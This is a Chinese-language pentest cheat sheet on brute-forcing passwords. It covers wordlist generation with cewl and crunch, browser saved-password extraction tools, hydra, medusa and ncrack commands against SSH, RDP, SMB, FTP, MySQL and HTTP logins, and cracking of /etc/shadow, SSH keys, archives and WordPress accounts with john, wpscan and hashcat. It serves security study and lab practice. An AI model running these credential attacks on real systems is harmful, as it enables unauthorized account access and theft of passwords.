暴力破解
========================================

常用字典集合
----------------------------------------
- `SecLists <https://github.com/danielmiessler/SecLists>`_
- `Blasting dictionary <https://github.com/rootphantomer/Blasting_dictionary>`_
- kali自带字典：/usr/share/wordlists/
- `SuperWordlist <https://github.com/CrackerCat/SuperWordlist>`_

字典生成工具
----------------------------------------
- `pydictor <https://github.com/LandGrey/pydictor>`_
- `Common User Passwords Profiler <https://github.com/Mebus/cupp>`_
- cewl字典生成工具
	+ 根据url爬取并生成字典：cewl http://www.ignitetechnologies.in/ -w dict.txt
	+ 生成长度最小限制的字典：cewl http://www.ignitetechnologies.in/ -m 9
	+ 爬取email地址：cewl http://www.ignitetechnologies.in/ -n -e
	+ 生成包含数字和字符的字典：cewl http://testphp.vulnweb.com/ --with-numbers
	+ 设置代理：cewl --proxy_host 192.168.1.103 --proxy_port 3128 -w dict.txt http://192.168.1.103/wordpress/
- crunch字典生成工具
	+ ``crunch <min-len> <max-len> [<charset string>] [options]``
		::
		
			min-len crunch要开始的最小长度字符串。即使不使用参数的值，也需要此选项
			max-len crunch要开始的最大长度字符串。即使不使用参数的值，也需要此选项
			charset string 在命令行使用crunch你可能必须指定字符集设置，否则将使用缺省的字符集设置。
			-c 数字 指定写入输出文件的行数，也即包含密码的个数
			-o wordlist.txt，指定输出文件的名称
			-p 字符串 或者-p 单词1 单词2 ...以排列组合的方式来生成字典。
			-q filename.txt，读取filename.txt
	+ 生成最小1位，最大8位，由26个小写字母为元素的所有组合 ``crunch 1 8``
	+ 生成最小为1,最大为6，由字符串组成所有字符组合 ``crunch 1 6 abcdefg``
	+ 指定字符串加特殊字符的组合 ``crunch 1 6 abcdefg\``
	+ 生成pass01-pass99所有数字组合 ``crunch 6 6 -t pass%%  >>newpwd.txt`` 
	+ 生成六位小写字母密码，其中前四位为pass ``crunch 6 6 -t pass@@  >>newpwd.txt`` 
	+ 生成六位密码，其中前四位为pass，后二位为大写 ``crunch 6 6 -t pass,,  >>newpwd.txt`` 
	+ 生成六位密码，其中前四位为pass，后二位为特殊字符 ``crunch 6 6 -t pass^^  >>newpwd.txt`` 
	+ 制作8为数字字典 ``crunch 8 8 charset.lst numeric -o num8.dic`` 
	+ 制作6为数字字典 ``crunch 6 6  0123456789 –o num6.dic`` 
	+ 制作139开头的手机密码字典 ``crunch 11 11  +0123456789 -t 139%%%%%%%% -o num13.dic`` 

浏览器缓存破解
----------------------------------------
- `Firefox_Decrypt <https://github.com/unode/firefox_decrypt>`_
	+ ``python3 firefox_decrypt.py ../esmhp32w.default-default``
- `chrome password grabber <https://github.com/x899/chrome_password_grabber>`_

web破解
----------------------------------------
- `Brute_force <..//_static//Brute_force.py>`_

弱密码爆破
----------------------------------------
- 超级弱口令检查工具：``https://github.com/shack2/SNETCracker``
- golang工具： ``https://github.com/oksbsb/crack``
- `hydra(九头蛇) <https://github.com/vanhauser-thc/thc-hydra>`_
	+ ``GUI版本(xhydra)``
	+ ``支持协议：adam6500、asterisk、cisco、cisco-enable、cvs、firebird、ftp、ftps、http[s]-{head|get|post}、http[s]-{get|post}-form、http-proxy、http-proxy-urlenum、icq、imap[s]、irc、ldap2[s]、ldap3[-{cram|digest}md5][s]、mssql、mysql、nntp、oracle-listener、oracle-sid、pcanywhere、pcnfs、pop3[s]、postgres、radmin2、rdp、redis、rexec、rlogin、rpcap、rsh、rtsp、s7-300、sip、smb、smtp[s]、smtp-enum、snmp、socks5、ssh、sshkey、svn、teamspeak、telnet[s]、vmauthd、vnc、xmpp``
	+ ``查看模块用法：hydra -U http-form-post``
	+ ``smb破解：hydra -l Administrator -P pass.txt smb://192.168.47`` 
	+ ``3389破解：hydra -l Administrator -P pass.txt rdp://192.168.47.124 -t 1 -V`` 
	+ ``ssh破解：hydra -l msfadmin -P pass.txt ssh://192.168.47.133 -vV`` 
	+ ``ftp破解：hydra -L user.txt -P pass.txt ftp://192.168.47.133 -s 21 -e nsr -t 1 -vV`` 
	+ ``mysql破解：hydra 192.168.43.113 mysql -l root -P /usr/share/wordlists/rockyou.txt -t 1`` 
	+ ``HTTP身份认证破解：hydra -L user.txt -P pass.txt 192.168.0.105 http-get``
	+ ``HTTP身份认证破解：hydra -l admin -P /usr/share/wordlists/rockyou.txt door.legacyhangtuah.com http-get /webdav``
	+ ``hydra -l admin -P /usr/share/wordlists/metasploit/unix_users.txt 172.16.100.103 http-get-form "/dvwa/login.php:username=^USER^&password=^PASS^&login=login:Login failed" -V``

		::
		
				-l表示单个用户名（使用-L表示用户名列表）
				-P表示使用以下密码列表
				http-post-form表示表单的类型
				/ dvwa / login-php是登录页面URL
				username是输入用户名的表单字段
				^ USER ^告诉Hydra使用字段中的用户名或列表
				password是输入密码的表单字段（可以是passwd，pass等）
				^ PASS ^告诉Hydra使用提供的密码列表
				登录表示Hydra登录失败消息
				登录失败是表单返回的登录失败消息
				-V用于显示每次尝试的详细输出 
				注：此类模块是破解HTTP协议表单数据。
				
	+ ``hydra -l 用户名 -P password_file 127.0.0.1 http-get-form/http-post-form "vulnerabilities/brute/:username=^USER^&password=^PASS^&submit=login:F=Username and/or password incorrect.:H=Cookie: security=low;PHPSESSID=xxxxxxx"``

		::

				说明：引号内的部分是自行构建的参数，这些参数用冒号隔开。
				第一个参数是接受收据的地址；
				第二个参数是页面接受的数据，需要破解的参数用^符号包起来；
				第三个参数是判断破解是否成功的标志(F代表错误，S代表正确)；
				第四个参数是本次请求中的head cookie
				
	+ ``-f``：破解了一个密码就停止
	+ 注意：不支持含有token的http协议破解。
				
- `medusa(美杜莎) <https://github.com/jmk-foofus/medusa>`_
	+ ``查询模块用法：medusa -M http -q``
	+ ``medusa -H ssh1.txt -u root -P passwd.txt -M ssh``
	+ ``medusa -h 192.168.100.105 -u root -P /home/kali/Downloads/rockyou.txt -M mysql``
	+ ``medusa -M http -h 192.168.10.1 -u admin -P /usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt -e ns -n 80 -F``

		::
		
				-M http 允许我们指定模块。
				-h 192.168.10.1 允许我们指定主机。
				-u admin 允许我们指定用户。
				-P [location of password list] 允许我们指定密码列表的位置。
				-e ns 允许我们指定额外的密码检查。 ns 变量允许我们使用用户名作为密码，并且使用空密码。
				-n 80 允许我们指定端口号码。
				-F 允许我们在成功找到用户名密码组合之后停止爆破。
				注：此模块是破解HTTP身份认证。
				medusa -M http -h door.legacyhangtuah.com -m DIR:webdav/ -u admin -P /usr/share/wordlists/rockyou.txt -e ns -n 80 -F

	+ HTTP表单破解: ``medusa -M web-form -q``
- `htpwdScan <https://github.com/lijiejie/htpwdScan>`_
	+ ``python htpwdScan.py -f dvwa.txt -d password=/usr/share/wordlists/metasploit/unix_users.txt  -err=\"password incorrect\"``
	+ ``python htpwdScan.py -d passwd=password.txt -u=\"http://xxx.com/index.php?m=login&username=test&passwd=test\" -get -err=\"success\":false\"``
- `patator <https://github.com/lanjelot/patator>`_
- ncrack
	+ HTTP身份认证破解：``ncrack -U /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt http://door.legacyhangtuah.com/webdav``
- fcrackzip
	| ``fcrackzip -b -l 6-6 -c 1 -p 000000 passwd.zip`` 
		
		::
		
			-b 暴力破解
			-c 1 限制密码是数字
			-l 6-6 限制密码长度为6
			-p 000000 初始化破解起点
	
	| ``fcrackzip -u -D -p passwd passwd.zip``
		
		::
		
			-D -p passwd 密码本passwd文件
			-u 不显示错误密码冗余信息
		
- rarcrack
	+ ``rarcrack 文件名 --threads 线程数 --type rar|7z|zip``
		::
		
			启动软件，会在当前目录生成.rar.xml文件。
			修改abc节点，更该爆破使用的字符集。
- john
	+ 破解/etc/shadow
		| ``unshadow /etc/passwd /etc/shadow > passwd_shadow``
		
			::
			
				unshadow命令基本上会结合/etc/passwd的数据和/etc/shadow的数据，
				创建1个含有用户名和密码详细信息的文件。
				
		| ``unique -v -inp=allwords.txt uniques.txt``
		
			::
			
				unique工具可以从一个密码字典中去除重复行。
		
		| ``密码文件破解：john --wordlist=/usr/share/john/password.lst --rules passwd_shadow``
		| ``直接破解：john passwd_shadow``
		| ``查看上一次破解结果：john --show shadow``
	+ 破解单条记录
		| ``jeevan:$6$LXNakaBRJ/tL5F2a$bCgiylk/LY2MeFp5z9YZyiezsNsgj.5/cDohRgFRBNdrwi/2IPkUO0rqVIM3O8vysc48g3Zpo/sHuo.qwBf4U1:18430:0:99999:7:::``
		| 存入password.txt文件
		| ``john --wordlist=/usr/share/wordlists/rockyou.txt password.txt``
		
	+ 破解ssh私钥文件
		| ``查看ssh2john位置：locate ssh2john``
		| ``python /usr/share/john/ssh2john.py root>root.crack``
		| ``john --wordlist=/usr/share/wordlists/rockyou.txt root.crack``
	+ 破解zip密码
		| ``zip2john tom.zip>hash5``
		| ``john hash5 --format=PKZIP --wordlist=/home/kali/Downloads/rockyou.txt``
		
- wordpress密码破解
	+ ``auxiliary/scanner/http/wordpress_xmlrpc_login``
	+ ``wpscan --url https://www.xxxxxxx.wiki/ -U 'admin' -P /root/wordlist.txt``
	+ `WPCracker <https://github.com/JoniRinta-Kahila/WPCracker>`_
		- 枚举用户：``.\WPCracker.exe --enum -u <Url to victims WordPress page> -o <Output file path (OPTIONAL)>``
		- 暴力破解：``.\WPCracker.exe --brute -u <Url to victims WordPress page> -p <Path to wordlist> -n <Username> -o <Output file path (OPTIONAL)>``
- hashcat
	+ 基于规则密码突变
		- 在线文档：``https://hashcat.net/wiki/doku.php?id=rule_based_attack``
		- 示例：``hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt``
